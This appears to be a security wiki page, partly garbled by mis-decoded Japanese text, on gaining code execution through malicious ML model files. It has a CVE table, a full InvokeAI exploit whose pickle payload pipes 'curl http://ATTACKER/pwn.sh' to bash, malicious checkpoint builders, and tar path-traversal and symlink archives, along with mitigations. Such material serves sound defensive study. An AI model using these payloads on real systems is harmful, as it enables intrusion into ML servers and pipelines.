# ãƒ¢ãƒ‡ãƒ« RCE

{{#include ../banners/hacktricks-training.md}}

## ãƒ¢ãƒ‡ãƒ«ã‚’RCEã«ãƒ­ãƒ¼ãƒ‰ã™ã‚‹

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

åŸ·ç­†æ™‚ç‚¹ã§ã€ä»¥ä¸‹ã¯ã“ã®ç¨®ã®è„†å¼±æ€§ã®ä¾‹ã§ã™:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* â€“ **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` â†’ code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow â†’ heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attackerâ€™s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays â€“ malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelâ€™s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attackerâ€™s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 â€¦ 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesnâ€™t cover old format â€“ â€œdowngrade attackâ€) | |
| **Others** (general)        | *Design flaw* â€“ Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### ğŸ†•  InvokeAI ã® `torch.load` çµŒç”±ã® RCE (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 â€“ 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

å†…éƒ¨ã§ã¯ã€ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯æœ€çµ‚çš„ã«æ¬¡ã‚’å‘¼ã³å‡ºã—ã¾ã™:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
æ¸¡ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãŒ **PyTorch checkpoint (`*.ckpt`)** ã®å ´åˆã€`torch.load` ã¯ **pickle deserialization** ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ã® URL ã‹ã‚‰ç›´æ¥å–å¾—ã•ã‚Œã‚‹ãŸã‚ã€æ”»æ’ƒè€…ã¯ã‚«ã‚¹ã‚¿ãƒ  `__reduce__` ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒã¤æ‚ªæ„ã‚ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ checkpoint å†…ã«åŸ‹ã‚è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯ **during deserialization** ä¸­ã«å®Ÿè¡Œã•ã‚Œã€InvokeAI ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ **remote code execution (RCE)** ã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã«ã¯ **CVE-2024-12029**ï¼ˆCVSS 9.8ã€EPSS 61.17 %ï¼‰ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã—ãŸã€‚

#### ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®æ‰‹é †

1. æ‚ªæ„ã®ã‚ã‚‹ checkpoint ã‚’ä½œæˆã™ã‚‹:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. è‡ªåˆ†ãŒç®¡ç†ã™ã‚‹ HTTP ã‚µãƒ¼ãƒãƒ¼ã« `payload.ckpt` ã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ï¼ˆä¾‹: `http://ATTACKER/payload.ckpt`ï¼‰ã€‚
3. è„†å¼±ãªã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ï¼ˆèªè¨¼ä¸è¦ï¼‰:
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false â†’ no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI ãŒãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã¨ `torch.load()` ã‚’å‘¼ã³å‡ºã— â†’ `os.system` gadget ãŒå®Ÿè¡Œã•ã‚Œã€æ”»æ’ƒè€…ã¯ InvokeAI ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã‚’å¾—ã‚‹ã€‚

æ—¢è£½ã® exploit: **Metasploit** ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ« `exploit/linux/http/invokeai_rce_cve_2024_12029` ãŒãƒ•ãƒ­ãƒ¼å…¨ä½“ã‚’è‡ªå‹•åŒ–ã™ã‚‹ã€‚

#### Conditions

â€¢  InvokeAI 5.3.1-5.4.2ï¼ˆscan flag ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯ **false**ï¼‰  
â€¢  æ”»æ’ƒè€…ã‹ã‚‰ `/api/v2/models/install` ã«åˆ°é”å¯èƒ½ã§ã‚ã‚‹ã“ã¨  
â€¢  ãƒ—ãƒ­ã‚»ã‚¹ãŒ shell commands ã‚’å®Ÿè¡Œã™ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã“ã¨

#### Mitigations

* **InvokeAI â‰¥ 5.4.3** ã«ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã™ã‚‹ â€” ã“ã®ãƒ‘ãƒƒãƒã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ `scan=True` ã‚’è¨­å®šã—ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå‰ã«ãƒãƒ«ã‚¦ã‚§ã‚¢ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã€‚  
* ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã§ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’èª­ã¿è¾¼ã‚€éš›ã¯ `torch.load(file, weights_only=True)` ã‚’ä½¿ã†ã‹ã€æ–°ã—ã„ [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’ä½¿ã†ã€‚  
* ãƒ¢ãƒ‡ãƒ«ã®ã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦ allow-lists / signatures ã‚’é©ç”¨ã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’æœ€å°æ¨©é™ã§å®Ÿè¡Œã™ã‚‹ã€‚

> âš ï¸ è¦šãˆã¦ãŠã„ã¦ãã ã•ã„ï¼š**ä»»æ„ã®** Python ã® pickle-based å½¢å¼ï¼ˆå¤šãã® `.pt`, `.pkl`, `.ckpt`, `.pth` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å«ã‚€ï¼‰ã¯ã€ä¿¡é ¼ã§ããªã„ã‚½ãƒ¼ã‚¹ã‹ã‚‰ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã“ã¨ãŒæœ¬è³ªçš„ã«å±é™ºã§ã™ã€‚

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### ğŸ†• NVIDIA Transformers4Rec ã® unsafe `torch.load` ã‚’ä»‹ã—ãŸ RCE (CVE-2025-23298)

NVIDIAã®Transformers4Recï¼ˆMerlinã®ä¸€éƒ¨ï¼‰ã¯ã€ãƒ¦ãƒ¼ã‚¶æä¾›ã®ãƒ‘ã‚¹ã«å¯¾ã—ã¦ç›´æ¥`torch.load()`ã‚’å‘¼ã³å‡ºã™å®‰å…¨ã§ãªã„ checkpoint loader ã‚’å…¬é–‹ã—ã¦ã„ã¾ã—ãŸã€‚`torch.load`ã¯Pythonã®`pickle`ã«ä¾å­˜ã™ã‚‹ãŸã‚ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ checkpoint ã¯ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã® reducer ã‚’ä»‹ã—ã¦ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

è„†å¼±ãªãƒ‘ã‚¹ï¼ˆä¿®æ­£å‰ï¼‰: `transformers4rec/torch/trainer/trainer.py` â†’ `load_model_trainer_states_from_checkpoint(...)` â†’ `torch.load(...)`.

ãªãœã“ã‚ŒãŒRCEã«ã¤ãªãŒã‚‹ã‹: Pythonã®pickleã§ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ reducerï¼ˆ`__reduce__`/`__setstate__`ï¼‰ã‚’å®šç¾©ã—ã¦å‘¼ã³å‡ºã—å¯èƒ½ã¨å¼•æ•°ã‚’è¿”ã™ã“ã¨ãŒã§ãã¾ã™ã€‚å‘¼ã³å‡ºã—å¯èƒ½ã¯ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºï¼ˆunpicklingï¼‰æ™‚ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ãã®ã‚ˆã†ãªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ checkpoint ã«å«ã¾ã‚Œã¦ã„ã‚‹ã¨ã€weights ãŒä½¿ç”¨ã•ã‚Œã‚‹å‰ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

æœ€å°ã®æ‚ªæ„ã®ã‚ã‚‹ checkpoint ã®ä¾‹:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- ãƒªãƒã‚¸ãƒˆãƒªã€ãƒã‚±ãƒƒãƒˆã€ã¾ãŸã¯ artifact registries çµŒç”±ã§å…±æœ‰ã•ã‚Œã‚‹ãƒˆãƒ­ã‚¤åŒ–ã•ã‚ŒãŸ checkpoints/models
- ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è‡ªå‹•ã§ãƒ­ãƒ¼ãƒ‰ã™ã‚‹è‡ªå‹• resume/deploy ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³
- å®Ÿè¡Œã¯ training/inference workers å†…ã§ç™ºç”Ÿã—ã€ã—ã°ã—ã°ç‰¹æ¨©æ˜‡æ ¼ã•ã‚ŒãŸçŠ¶æ…‹ã§å‹•ä½œã™ã‚‹ï¼ˆä¾‹: root in containersï¼‰

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ã§ã¯ç›´æ¥ã® `torch.load()` ã‚’ã€`transformers4rec/utils/serialization.py` ã«å®Ÿè£…ã•ã‚ŒãŸè¨±å¯ãƒªã‚¹ãƒˆæ–¹å¼ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ã«ç½®ãæ›ãˆã¾ã—ãŸã€‚æ–°ã—ã„ãƒ­ãƒ¼ãƒ€ã¯å‹/ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’æ¤œè¨¼ã—ã€ãƒ­ãƒ¼ãƒ‰ä¸­ã«ä»»æ„ã® callables ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã‚’é˜²ãã¾ã™ã€‚

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example â€“ crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- ãƒ¢ãƒ‡ãƒ«ã‚’èª­ã¿è¾¼ã‚€:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# âš ï¸ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## ãƒ¢ãƒ‡ãƒ«ã‚’ä½¿ã£ãŸ Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), å¤šãã® AI ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ä½¿ç”¨ã•ã‚Œã‚‹ãƒ¢ãƒ‡ãƒ«å½¢å¼ã¯ã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ï¼ˆé€šå¸¸ã¯ `.zip`ï¼‰ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚ãã®ãŸã‚ã€ã“ã‚Œã‚‰ã®å½¢å¼ã‚’æ‚ªç”¨ã—ã¦ path traversal attacks ã‚’è¡Œã„ã€ãƒ¢ãƒ‡ãƒ«ãŒãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

ä¾‹ãˆã°ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ã†ã¨ã€ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸã¨ãã« `/tmp` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹ãƒ¢ãƒ‡ãƒ«ã‚’ä½œæˆã§ãã¾ã™:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
ã‚ã‚‹ã„ã¯ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ã†ã¨ã€èª­ã¿è¾¼ã¾ã‚ŒãŸã¨ãã« `/tmp` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¸ã® symlink ã‚’ä½œæˆã™ã‚‹ãƒ¢ãƒ‡ãƒ«ã‚’ä½œæˆã§ãã¾ã™:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### è©³ç´°è§£æ: Keras .keras deserialization and gadget hunting

.keras internalsã€Lambda-layer RCEã€â‰¤ 3.8 ã«ãŠã‘ã‚‹ arbitrary import issueã€ãã—ã¦ allowlist å†…ã§ã® post-fix gadget discovery ã«é–¢ã™ã‚‹è©³ç´°ãªã‚¬ã‚¤ãƒ‰ã¯ã€æ¬¡ã‚’å‚ç…§ã—ã¦ãã ã•ã„:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## å‚è€ƒè³‡æ–™

- [OffSec blog â€“ "CVE-2024-12029 â€“ InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch â€“ security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog â€“ CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
